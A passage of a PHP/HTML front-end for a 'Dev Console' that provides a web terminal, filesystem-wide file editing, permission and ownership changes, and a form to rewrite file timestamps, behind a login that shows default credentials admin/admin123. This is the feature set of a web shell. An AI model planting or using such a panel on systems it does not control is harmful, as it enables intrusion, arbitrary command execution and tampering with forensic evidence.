    'User Agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'Request Method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
    'Request URI' => $_SERVER['REQUEST_URI'] ?? '/',
    'Referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct Visit / No Referer',
    'Accept Language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Not Specified',
    'Accept Encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'Not Specified',
    'Connection Type' => $_SERVER['HTTP_CONNECTION'] ?? 'Unknown',
    'Request Timestamp' => date('Y-m-d H:i:s', (int) ($_SERVER['REQUEST_TIME'] ?? time()))
];
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>⚡ Dev Console</title>
    <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            margin: 0;
            padding: 0;
            font-size: 13px;
        }

        .topbar {
            background: #161b22;
            border-bottom: 1px solid #30363d;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .topbar h1 {
            margin: 0;
            font-size: 16px;
            color: #58a6ff;
        }

        .badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
            margin-left: 10px;
        }

        .badge-dev {
            background: #f85149;
            color: #fff;
        }

        .badge-os {
            background: #1f6feb;
            color: #fff;
        }

        .btn {
            padding: 6px 12px;
            border-radius: 6px;
            border: 1px solid #30363d;
            background: #21262d;
            color: #c9d1d9;
            cursor: pointer;
            font-size: 12px;
            text-decoration: none;
            display: inline-block;
        }

        .btn:hover {
            background: #30363d;
        }

        .btn-primary {
            background: #238636;
            border-color: rgba(240, 246, 252, 0.1);
            color: #fff;
        }

        .btn-primary:hover {
            background: #2ea043;
        }

        .btn-danger {
            background: #da3633;
            color: #fff;
            border-color: rgba(240, 246, 252, 0.1);
        }

        .btn-sm {
            padding: 3px 8px;
            font-size: 11px;
        }

        .container {
            max-width: 1400px;
            margin: 20px auto;
            padding: 0 20px;
        }

        .breadcrumb {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 10px 14px;
            margin-bottom: 12px;
            font-family: monospace;
            word-break: break-all;
        }

        .breadcrumb a {
            color: #58a6ff;
            text-decoration: none;
        }

        .breadcrumb a:hover {
            text-decoration: underline;
        }

        .toolbar {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 12px;
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }

        .toolbar input[type=text],
        .toolbar select {
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 6px 10px;
            border-radius: 6px;
            font-size: 12px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            overflow: hidden;
        }

        th {
            background: #21262d;
            color: #8b949e;
            text-align: left;
            padding: 10px 12px;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid #30363d;
        }

        td {
            padding: 8px 12px;
            border-bottom: 1px solid #21262d;
        }

        tr:hover {
            background: #1c2128;
        }

        .fname {
            font-family: monospace;
        }

        .fname a {
            color: #58a6ff;
            text-decoration: none;
        }

        .fname a:hover {
            text-decoration: underline;
        }

        .perms {
            font-family: monospace;
            color: #7ee787;
            font-size: 11px;
        }

        .size {
            color: #8b949e;
            font-family: monospace;
            font-size: 11px;
        }

        .actions-cell {
            white-space: nowrap;
        }

        .actions-cell .btn {
            margin-right: 3px;
        }

        .editor-wrap {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            overflow: hidden;
        }

        .editor-header {
            background: #21262d;
            padding: 10px 14px;
            border-bottom: 1px solid #30363d;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }

        .editor-body textarea {
            width: 100%;
            min-height: 500px;
            background: #0d1117;
            color: #c9d1d9;
            border: none;
            padding: 14px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 13px;
            line-height: 1.5;
            resize: vertical;
            tab-size: 4;
            outline: none;
        }

        .hex-view,
        .raw-view {
            background: #0d1117;
            color: #7ee787;
            padding: 14px;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            line-height: 1.6;
            white-space: pre;
            overflow: auto;
            max-height: 600px;
        }

        .terminal {
            background: #000;
            border: 1px solid #30363d;
            border-radius: 6px;
            overflow: hidden;
            margin-top: 20px;
        }

        .term-header {
            background: #21262d;
            padding: 8px 14px;
            border-bottom: 1px solid #30363d;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }

        .term-dots {
            display: inline-flex;
            gap: 6px;
        }

        .term-dots span {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
        }

        .term-dots span:nth-child(1) {
            background: #ff5f56;
        }

        .term-dots span:nth-child(2) {
            background: #ffbd2e;
        }

        .term-dots span:nth-child(3) {
            background: #27c93f;
        }

        .term-body {
            padding: 14px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            color: #e6edf3;
            min-height: 200px;
            max-height: 500px;
            overflow: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .term-body .out {
            color: #e6edf3;
        }

        .term-body .err {
            color: #ffa198;
        }

        .term-body .cmd {
            color: #7ee787;
        }

        .term-input {
            display: flex;
            background: #0d1117;
            border-top: 1px solid #30363d;
        }

        .term-input span {
            color: #7ee787;
            padding: 10px;
            font-family: 'Consolas', monospace;
        }

        .term-input input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e6edf3;
            padding: 10px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            outline: none;
        }

        .modal-bg {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-bg.active {
            display: flex;
        }

        .modal {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            min-width: 400px;
            max-width: 90vw;
        }

        .modal h3 {
            margin: 0 0 14px 0;
            color: #58a6ff;
        }

        .modal input,
        .modal select {
            width: 100%;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 8px;
            border-radius: 6px;
            margin-bottom: 10px;
        }

        .login-box {
            max-width: 400px;
            margin: 100px auto;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 30px;
        }

        .login-box h2 {
            color: #58a6ff;
            margin-top: 0;
        }

        .login-box input {
            width: 100%;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 12px;
        }

        .meta-table td:first-child {
            color: #8b949e;
            width: 180px;
        }

        .meta-table td:last-child {
            font-family: monospace;
            color: #7ee787;
            word-break: break-all;
        }

        .btn-floating {
            position: fixed;
            top: 16px;
            left: 16px;
            z-index: 1000;
            background: #0366d6;
            color: #fff;
            border: none;
            padding: 10px 16px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .btn-floating:hover {
            background: #0255b3;
        }

        .drawer {
            position: fixed;
            top: 0;
            left: -100%;
            width: 100%;
            max-width: 550px;
            height: 100vh;
            background: #161b22;
            z-index: 1001;
            box-shadow: 4px 0 24px rgba(0, 0, 0, 0.2);
            transition: left 0.3s ease;
            display: flex;
            flex-direction: column;
        }

        .drawer.open {
            left: 0;
        }

        .drawer-header {
            padding: 16px 20px;
            border-bottom: 1px solid #30363d;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #21262d;
        }

        .drawer-body {
            padding: 20px;
            overflow-y: auto;
            flex: 1;
        }

        .drawer-body h4 {
            color: #58a6ff;
            margin: 20px 0 10px 0;
        }

        .drawer-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.4);
            z-index: 1000;
            display: none;
        }

        .drawer-overlay.active {
            display: block;
        }

        .drop-zone {
            border: 2px dashed #30363d;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            background: #161b22;
            color: #8b949e;
            transition: all 0.3s ease;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .drop-zone:hover,
        .drop-zone.dragover {
            border-color: #58a6ff;
            background: #1f6feb1a;
            color: #58a6ff;
        }

        .drop-zone i {
            font-size: 24px;
            margin-bottom: 8px;
            display: block;
        }
    </style>
</head>

<body>
    <?php if (!$isDev): ?>
        <div class="login-box">
            <h2>🔐 Dev Console</h2>
            <p style="color:#8b949e;">Login required</p>
            <?php if (!empty($loginError)): ?>
                <div style="background:#da363333; border:1px solid #da3633; color:#ffa198; padding:10px; border-radius:6px; margin-bottom:12px;"><?= Security::escape($loginError) ?></div><?php endif; ?>
            <form method="post" action="?act=login">
                <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
                <input type="text" name="username" placeholder="Username (admin)" required autofocus>
                <input type="password" name="password" placeholder="Password (admin123)" required>
                <button type="submit" class="btn btn-primary" style="width:100%;">Login</button>
            </form>
        </div>
    </body>

    </html>
    <?php exit; endif; ?>

<button class="btn-floating" onclick="toggleDrawer()">📊 Diagnostics</button>
<div class="drawer-overlay" id="overlay" onclick="toggleDrawer()"></div>
<div class="drawer" id="drawer">
    <div class="drawer-header">
        <h3 style="margin:0; color:#58a6ff;">System Telemetry</h3>
        <button class="btn" onclick="toggleDrawer()">✕ Close</button>
    </div>
    <div class="drawer-body">
        <h4>Server Environment</h4>
        <table>
            <?php foreach ($serverDiagnostics as $k => $v): ?>
                <tr>
                    <td><strong><?= Security::escape($k) ?></strong></td>
                    <td><?= Security::escape((string) $v) ?></td>
                </tr>
            <?php endforeach; ?>
        </table>
        <h4>Client Connection</h4>
        <table>
            <?php foreach ($clientDiagnostics as $k => $v): ?>
                <tr>
                    <td><strong><?= Security::escape($k) ?></strong></td>
                    <td><?= Security::escape((string) $v) ?></td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>
</div>

<div class="topbar">
    <h1>⚡ Dev Console
        <span class="badge badge-dev">DEV MODE</span>
        <span class="badge badge-os"><?= Security::escape(OSDetector::getOSName()) ?></span>
    </h1>
    <div><a href="?act=logout" class="btn">Logout</a></div>
</div>

<div class="container">
    <?php if ($editorFile): ?>
        <div class="breadcrumb">Editing: <strong><?= Security::escape($editorFile) ?></strong> (<?= Security::escape($editorMime) ?>, <?= $editorBinary ? 'BINARY' : 'TEXT' ?>, Lang: <?= Security::escape($editorLang) ?>)
            <div style="float:right;">
                <a href="?hex=<?= urlencode($editorFile) ?>" class="btn btn-sm">🔬 Hex</a>
                <a href="?raw=<?= urlencode($editorFile) ?>" class="btn btn-sm">📄 Raw</a>
                <a href="?meta=<?= urlencode($editorFile) ?>" class="btn btn-sm">ℹ️ Meta</a>
                <a href="?dir=<?= urlencode($relDir) ?>" class="btn btn-sm">← Back</a>
            </div>
        </div>
        <form method="post" onsubmit="revertHiddenChars()">
            <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
            <input type="hidden" name="action" value="save_file">
            <input type="hidden" name="path" value="<?= Security::escape($editorFile) ?>">
            <div class="editor-wrap">
                <div class="editor-header">
                    <div>
                        <button type="submit" class="btn btn-primary" <?= $editorBinary ? 'disabled title="Cannot save binary files directly"' : '' ?>>💾 Save</button>
                        <button type="button" class="btn" onclick="toggleHiddenChars()">Show Hidden</button>
                        <?php if ($editorBinary): ?>
                            <span style="color:#ffa198; margin-left:10px;">⚠ Binary file - hex view (read-only)</span>
                        <?php endif; ?>
                    </div>
                </div>
                <div class="editor-body">
                    <?php if ($editorBinary): ?>
                        <div class="hex-view"><?= Security::escape($editorContent) ?></div>
                    <?php else: ?>
                        <textarea name="content" id="editorArea" spellcheck="false" data-lang="<?= Security::escape($editorLang) ?>"><?= Security::escape($editorContent) ?></textarea>
                    <?php endif; ?>
                </div>
            </div>
        </form>

    <?php elseif ($hexFile): ?>
        <div class="breadcrumb">Hex View: <strong><?= Security::escape($hexFile) ?></strong>
            <div style="float:right;">
                <a href="?edit=<?= urlencode($hexFile) ?>" class="btn btn-sm">✏️ Edit</a>
                <a href="?raw=<?= urlencode($hexFile) ?>" class="btn btn-sm">📄 Raw</a>
                <a href="?meta=<?= urlencode($hexFile) ?>" class="btn btn-sm">ℹ️ Meta</a>
                <a href="?dir=<?= urlencode($relDir) ?>" class="btn btn-sm">← Back</a>
            </div>
        </div>
        <div class="editor-wrap">
            <div class="editor-header"><span>Binary Inspector (first 256KB)</span></div>
            <div class="hex-view"><?= Security::escape($hexData) ?></div>
        </div>

    <?php elseif ($rawFile): ?>
        <div class="breadcrumb">Raw View: <strong><?= Security::escape($rawFile) ?></strong> (<?= FileEngine::formatBytes($rawSize) ?>)
            <div style="float:right;">
                <a href="?edit=<?= urlencode($rawFile) ?>" class="btn btn-sm">✏️ Edit</a>
                <a href="?hex=<?= urlencode($rawFile) ?>" class="btn btn-sm">🔬 Hex</a>
                <a href="?meta=<?= urlencode($rawFile) ?>" class="btn btn-sm">ℹ️ Meta</a>
                <a href="?dir=<?= urlencode($relDir) ?>" class="btn btn-sm">← Back</a>
            </div>
        </div>
        <div class="editor-wrap">
            <div class="editor-header"><span>Raw Content (unescaped)</span></div>
            <div class="raw-view"><?= Security::escape($rawData) ?></div>
        </div>

    <?php elseif ($metaFile): ?>
        <div class="breadcrumb">Metadata: <strong><?= Security::escape($metaFile) ?></strong>
            <div style="float:right;">
                <a href="?edit=<?= urlencode($metaFile) ?>" class="btn btn-sm">✏️ Edit</a>
                <a href="?hex=<?= urlencode($metaFile) ?>" class="btn btn-sm">🔬 Hex</a>
                <a href="?raw=<?= urlencode($metaFile) ?>" class="btn btn-sm">📄 Raw</a>
                <a href="?dir=<?= urlencode($relDir) ?>" class="btn btn-sm">← Back</a>
            </div>
        </div>
        <table class="meta-table">
            <?php foreach ($metaData as $k => $v): ?>
                <tr>
                    <td><strong><?= Security::escape($k) ?></strong></td>
                    <td><?= Security::escape((string) $v) ?></td>
                </tr>
            <?php endforeach; ?>
        </table>
        <div style="margin-top:20px; background:#161b22; border:1px solid #30363d; border-radius:6px; padding:16px;">
            <h3 style="color:#58a6ff; margin-top:0;">Edit Metadata</h3>
            <form method="post" style="display:grid; gap:10px;">
                <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
                <input type="hidden" name="action" value="touch">
                <input type="hidden" name="path" value="<?= Security::escape($metaFile) ?>">
                <div>
                    <label style="color:#8b949e;">Modified Time (Unix timestamp):</label>
                    <input type="number" name="mtime" value="<?= (int) strtotime($metaData['Modified']) ?>" style="width:100%; background:#0d1117; border:1px solid #30363d; color:#c9d1d9; padding:8px; border-radius:6px;">
                </div>
                <div>
                    <label style="color:#8b949e;">Access Time (Unix timestamp):</label>
                    <input type="number" name="atime" value="<?= (int) strtotime($metaData['Accessed']) ?>" style="width:100%; background:#0d1117; border:1px solid #30363d; color:#c9d1d9; padding:8px; border-radius:6px;">
                </div>
                <?php if (!OSDetector::isWindows()): ?>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                        <div>
                            <form method="post" style="display:grid; gap:6px;">
                                <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
                                <input type="hidden" name="action" value="chown">
                                <input type="hidden" name="items[]" value="<?= Security::escape(basename($metaFile)) ?>">
                                <label style="color:#8b949e;">Owner:</label>
                                <input type="text" name="user" value="<?= Security::escape($metaData['Owner']) ?>" style="width:100%; background:#0d1117; border:1px solid #30363d; color:#c9d1d9; padding:8px; border-radius:6px;">
                                <button type="submit" class="btn btn-primary">Change Owner</button>
                            </form>
                        </div>
                        <div>
                            <form method="post" style="display:grid; gap:6px;">
                                <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
                                <input type="hidden" name="action" value="chgrp">
                                <input type="hidden" name="items[]" value="<?= Security::escape(basename($metaFile)) ?>">
                                <label style="color:#8b949e;">Group:</label>
                                <input type="text" name="group" value="<?= Security::escape($metaData['Group']) ?>" style="width:100%; background:#0d1117; border:1px solid #30363d; color:#c9d1d9; padding:8px; border-radius:6px;">
                                <button type="submit" class="btn btn-primary">Change Group</button>
                            </form>
                        </div>
                    </div>
                <?php endif; ?>
                <button type="submit" class="btn btn-primary">Update Timestamps</button>
            </form>
        </div>

    <?php else: ?>
        <div class="breadcrumb">📂
            <?php
            $isRoot = OSDetector::isWindows() ? preg_match('/^[a-zA-Z]:\\\\?$/', $cwd) : $cwd === '/';
            if ($isDev) {
                $parts = $cwd === '/' ? [''] : explode(DIRECTORY_SEPARATOR, ltrim($cwd, DIRECTORY_SEPARATOR));
                echo '<a href="?dir=' . urlencode($cwd[0] === '/' ? '/' : '') . '">' . ($cwd[0] === '/' ? '/' : 'ROOT') . '</a>';
                $path = $cwd[0] === '/' ? '/' : '';
                foreach ($parts as $i => $p) {
                    if ($p === '')
                        continue;
                    $path = $path === '/' ? '/' . $p : $path . DIRECTORY_SEPARATOR . $p;
                    echo ' / <a href="?dir=' . urlencode($path) . '">' . Security::escape($p) . '</a>';
                }
            } else {
                $rel = ltrim(substr($cwd, strlen(STORAGE_ROOT)), DIRECTORY_SEPARATOR);
                echo '<a href="?dir=">storage</a>';
                if ($rel !== '') {
                    $parts = explode(DIRECTORY_SEPARATOR, $rel);
                    $path = '';
                    foreach ($parts as $p) {
                        $path .= ($path === '' ? '' : '/') . $p;
                        echo ' / <a href="?dir=' . urlencode($path) . '">' . Security::escape($p) . '</a>';
                    }
                }
            }
            ?>
        </div>

        <div class="drop-zone" id="dropZone">
            <i>📁</i>
            <strong>Drag & Drop files here</strong> or click to select
            <input type="file" name="files[]" id="fileInput" multiple style="display: none;">
        </div>

        <form method="post" id="mainForm" enctype="multipart/form-data">
            <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
            <input type="hidden" name="action" id="mainAction" value="">
            <input type="hidden" name="dest" id="mainDest" value="">
            <input type="hidden" name="mode" id="mainMode" value="">
            <input type="hidden" name="format" id="mainFormat" value="">
            <input type="text" name="name" id="mainName" style="display:none;">
            <input type="text" name="content" id="mainContent" style="display:none;">

            <div class="toolbar">
                <button type="button" class="btn" onclick="promptAction('mkdir','New folder name:')">📁 New Folder</button>
                <button type="button" class="btn" onclick="promptAction('mkfile','New file name:', true)">📄 New File (with content)</button>
                <button type="button" class="btn" onclick="batchAction('delete','Delete selected items?')">🗑 Delete</button>
                <button type="button" class="btn" onclick="promptDest('move','Move to path:')">📦 Move</button>
                <button type="button" class="btn" onclick="promptDest('copy','Copy to path:')">📋 Copy</button>
                <button type="button" class="btn" onclick="promptChmod()">🔒 Chmod</button>
                <?php if (!OSDetector::isWindows()): ?>
                    <button type="button" class="btn" onclick="promptChown()">👤 Chown</button>
                    <button type="button" class="btn" onclick="promptChgrp()">👥 Chgrp</button>
                <?php endif; ?>
                <button type="button" class="btn" onclick="promptArchive()">🗜 Archive</button>
                <button type="button" class="btn" onclick="location.reload()">🔄 Refresh</button>
            </div>

            <table>
                <thead>
                    <tr>
                        <th style="width:30px;"><input type="checkbox" onclick="toggleAll(this)"></th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Perms</th>
                        <th>Owner</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $rootForParent = $isDev ? '/' : STORAGE_ROOT;
                    if (!OSDetector::isWindows() ? $cwd !== '/' : !preg_match('/^[a-zA-Z]:\\\\?$/', $cwd)):
                        $parentRel = dirname($relDir);
                        if ($parentRel === '.')
                            $parentRel = '';
                        ?>
                        <tr>
                            <td></td>
                            <td class="fname">📁 <a href="?dir=<?= urlencode($parentRel) ?>">..</a></td>
                            <td colspan="5" style="color:#8b949e;">Parent Directory</td>
                        </tr>
                    <?php endif; ?>
                    <?php foreach ($items as $it):
                        $itemRel = $relDir === '' ? $it['name'] : $relDir . '/' . $it['name'];
                        $isZip = strtolower(pathinfo($it['name'], PATHINFO_EXTENSION)) === 'zip';
                        ?>
                        <tr>
                            <td><input type="checkbox" name="items[]" value="<?= Security::escape($it['name']) ?>" form="mainForm"></td>
                            <td class="fname">
                                <?= FileEngine::mimeTypeIcon($it['mime'], $it['is_dir']) ?>
                                <?php if ($it['is_dir']): ?>
                                    <a href="?dir=<?= urlencode($itemRel) ?>"><?= Security::escape($it['name']) ?></a>
                                <?php else: ?>
                                    <a href="?edit=<?= urlencode($itemRel) ?>" title="Edit"><?= Security::escape($it['name']) ?></a>
                                <?php endif; ?>
                                <?php if ($it['is_link']): ?><span style="color:#d29922;"> →</span><?php endif; ?>
                                <?php if (!$it['is_readable']): ?><span style="color:#f85149;" title="Not readable">🔒</span><?php endif; ?>
                            </td>
                            <td class="size"><?= Security::escape($it['size_fmt']) ?></td>
                            <td class="perms" title="<?= Security::escape($it['perms_oct']) ?>"><?= Security::escape($it['perms']) ?></td>
                            <td style="color:#8b949e; font-size:11px;"><?= Security::escape($it['owner']) ?>/<?= Security::escape($it['group']) ?></td>
                            <td style="color:#8b949e; font-size:11px;"><?= date('Y-m-d H:i', $it['mtime']) ?></td>
                            <td class="actions-cell">
                                <?php if (!$it['is_dir']): ?>
                                    <a href="?edit=<?= urlencode($itemRel) ?>" class="btn btn-sm" title="Edit">✏️</a>
                                    <a href="?hex=<?= urlencode($itemRel) ?>" class="btn btn-sm" title="Hex">🔬</a>
                                    <a href="?raw=<?= urlencode($itemRel) ?>" class="btn btn-sm" title="Raw">📄</a>
                                <?php endif; ?>
                                <a href="?meta=<?= urlencode($itemRel) ?>" class="btn btn-sm" title="Metadata">ℹ️</a>
                                <?php if ($isZip): ?>
                                    <form method="post" style="display:inline;">
                                        <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
                                        <input type="hidden" name="action" value="extract">
                                        <input type="hidden" name="file" value="<?= Security::escape($it['name']) ?>">
                                        <button type="submit" class="btn btn-sm btn-primary" title="Extract ZIP">📂</button>
                                    </form>
                                <?php endif; ?>
                                <button type="button" class="btn btn-sm" onclick="renameItem('<?= Security::escape($it['name']) ?>')">📝</button>
                                <button type="button" class="btn btn-sm btn-danger" onclick="singleDelete('<?= Security::escape($it['name']) ?>')">🗑</button>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    <?php if (empty($items)): ?>
                        <tr>
                            <td colspan="7" style="text-align:center; color:#8b949e; padding:30px;">Empty directory</td>
                        </tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </form>

        <div class="terminal">
            <div class="term-header">
                <div class="term-dots"><span></span><span></span><span></span></div>
                <span style="color:#8b949e;">terminal — <?= Security::escape($cwd) ?></span>
                <span style="color:#8b949e;"><?= Security::escape(OSDetector::getOSName()) ?></span>
            </div>
            <div class="term-body" id="termOutput">
                <div class="out">Dev Terminal ready. Type commands below.</div>
            </div>
            <?php if ($termResult !== null): ?>
                <script>
                    document.addEventListener('DOMContentLoaded', function () {
                        var out = document.getElementById('termOutput');
                        out.innerHTML += '<div class="cmd">$ <?= Security::escape($_POST['cmd'] ?? '') ?></div>';
                        <?php if (!empty($termResult['out'])): ?>
                            out.innerHTML += '<div class="out"><?= Security::escape($termResult['out']) ?></div>';
                        <?php endif; ?>
                        <?php if (!empty($termResult['err'])): ?>
                            out.innerHTML += '<div class="err"><?= Security::escape($termResult['err']) ?></div>';
                        <?php endif; ?>
                        out.innerHTML += '<div style="color:#8b949e;">[exit code: <?= (int) $termResult['code'] ?>]</div>';
                        out.scrollTop = out.scrollHeight;
                    });
                </script>
            <?php endif; ?>
            <form method="post">
                <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
                <input type="hidden" name="action" value="terminal">
                <input type="hidden" name="term_cwd" value="<?= Security::escape($cwd) ?>">
                <div class="term-input">
                    <span>$</span>
                    <input type="text" name="cmd" id="termCmd" autocomplete="off" placeholder="Enter command..." autofocus>
                </div>
            </form>
        </div>
    <?php endif; ?>
</div>

<!-- Rename Modal -->
<div class="modal-bg" id="renameModal">
    <div class="modal">
        <h3>Rename</h3>
        <form method="post">
            <input type="hidden" name="csrf" value="<?= Security::escape($csrf) ?>">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="old" id="renameOld">
            <label style="color:#8b949e;">New name:</label>
            <input type="text" name="new" id="renameNew" required>
            <button type="submit" class="btn btn-primary">Rename</button>
            <button type="button" class="btn" onclick="document.getElementById('renameModal').classList.remove('active')">Cancel</button>
        </form>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
<script>
    <?php if ($notice): ?>
        Swal.fire({ icon: 'success', title: 'Success', text: '<?= Security::escape($notice) ?>', timer: 3000, showConfirmButton: false });
    <?php endif; ?>
    <?php if ($error): ?>
        Swal.fire({ icon: 'error', title: 'Error', text: '<?= Security::escape($error) ?>' });
    <?php endif; ?>

    function revertHiddenChars() {
        var area = document.getElementById('editorArea');
        if (area && area.dataset.original !== undefined) {
            area.value = area.dataset.original;
        }
    }

    function toggleDrawer() {
        document.getElementById('drawer').classList.toggle('open');
        document.getElementById('overlay').classList.toggle('active');
    }
    function toggleAll(src) { document.querySelectorAll('input[name="items[]"]').forEach(cb => cb.checked = src.checked); }
    function submitForm(action, extras) {
        var f = document.getElementById('mainForm');
        document.getElementById('mainAction').value = action;
        document.getElementById('mainDest').value = ''; document.getElementById('mainMode').value = '';
        document.getElementById('mainFormat').value = ''; document.getElementById('mainName').value = '';
        document.getElementById('mainContent').value = '';
        if (extras) {
            if (extras.dest !== undefined) document.getElementById('mainDest').value = extras.dest;
            if (extras.mode !== undefined) document.getElementById('mainMode').value = extras.mode;
            if (extras.format !== undefined) document.getElementById('mainFormat').value = extras.format;
            if (extras.name !== undefined) document.getElementById('mainName').value = extras.name;
            if (extras.content !== undefined) document.getElementById('mainContent').value = extras.content;
        }
        f.submit();
    }
    function promptAction(action, msg, withContent = false) {
        var v = prompt(msg);
        if (!v) return;
        if (withContent) {
            var c = prompt('File Content:');
            submitForm(action, { name: v, content: c || '' });
        } else {
            submitForm(action, { name: v });
        }
    }
    function batchAction(action, msg) {
        var checked = document.querySelectorAll('input[name="items[]"]:checked');
        if (checked.length === 0) { Swal.fire('Select items first'); return; }
        Swal.fire({ title: 'Confirm', text: msg + ' (' + checked.length + ' items)', icon: 'warning', showCancelButton: true, confirmButtonText: 'Yes' }).then((result) => {
            if (result.isConfirmed) submitForm(action);
        });
    }
    function promptDest(action, msg) {
        var checked = document.querySelectorAll('input[name="items[]"]:checked');
        if (checked.length === 0) { Swal.fire('Select items first'); return; }
        var v = prompt(msg);
        if (!v) return;
        submitForm(action, { dest: v });
    }
    function promptChmod() {
        var checked = document.querySelectorAll('input[name="items[]"]:checked');
        if (checked.length === 0) { Swal.fire('Select items first'); return; }
        var v = prompt('Permission (e.g., 0755, 0644):', '0755');
        if (!v) return;
        submitForm('chmod', { mode: v });
    }
    function promptChown() {
        var checked = document.querySelectorAll('input[name="items[]"]:checked');
        if (checked.length === 0) { Swal.fire('Select items first'); return; }
        var v = prompt('Owner (username):');
        if (!v) return;
        var f = document.getElementById('mainForm');
        var input = document.createElement('input'); input.type = 'hidden'; input.name = 'user'; input.value = v;
        f.appendChild(input); submitForm('chown');
    }
    function promptChgrp() {
        var checked = document.querySelectorAll('input[name="items[]"]:checked');
        if (checked.length === 0) { Swal.fire('Select items first'); return; }
        var v = prompt('Group:');
        if (!v) return;
        var f = document.getElementById('mainForm');
        var input = document.createElement('input'); input.type = 'hidden'; input.name = 'group'; input.value = v;
        f.appendChild(input); submitForm('chgrp');
    }
    function promptArchive() {
        var checked = document.querySelectorAll('input[name="items[]"]:checked');
        if (checked.length === 0) { Swal.fire('Select items first'); return; }
        var f = prompt('Format (zip/tar/gz):', 'zip');
        if (!f || !['zip', 'tar', 'gz'].includes(f)) { Swal.fire('Invalid format'); return; }
        submitForm('archive', { format: f });
    }
    function renameItem(name) {
        document.getElementById('renameOld').value = name;
        document.getElementById('renameNew').value = name;
        document.getElementById('renameModal').classList.add('active');
    }
    function singleDelete(name) {
        Swal.fire({ title: 'Delete "' + name + '"?', icon: 'warning', showCancelButton: true, confirmButtonText: 'Yes, delete it' }).then((result) => {
            if (result.isConfirmed) {
                document.querySelectorAll('input[name="items[]"]').forEach(cb => cb.checked = false);
                var cb = document.querySelector('input[name="items[]"][value="' + name + '"]');
                if (cb) cb.checked = true;
                submitForm('delete');
            }
        });
    }
    function toggleHiddenChars() {
        var area = document.getElementById('editorArea');
        if (!area || area.tagName !== 'TEXTAREA') return;
        if (area.dataset.original === undefined) area.dataset.original = area.value;
        if (area.dataset.shown === '1') {
            area.value = area.dataset.original; area.dataset.shown = '0';
        } else {
            area.value = area.dataset.original.replace(/\t/g, '→').replace(/\r/g, '␍').replace(/ /g, '·');
            area.dataset.shown = '1';
        }
    }
    document.addEventListener('keydown', function (e) {
        if (e.target.tagName === 'TEXTAREA' && e.key === 'Tab') {
            e.preventDefault();
            var s = e.target.selectionStart, end = e.target.selectionEnd;
            e.target.value = e.target.value.substring(0, s) + '    ' + e.target.value.substring(end);
            e.target.selectionStart = e.target.selectionEnd = s + 4;
        }
    });
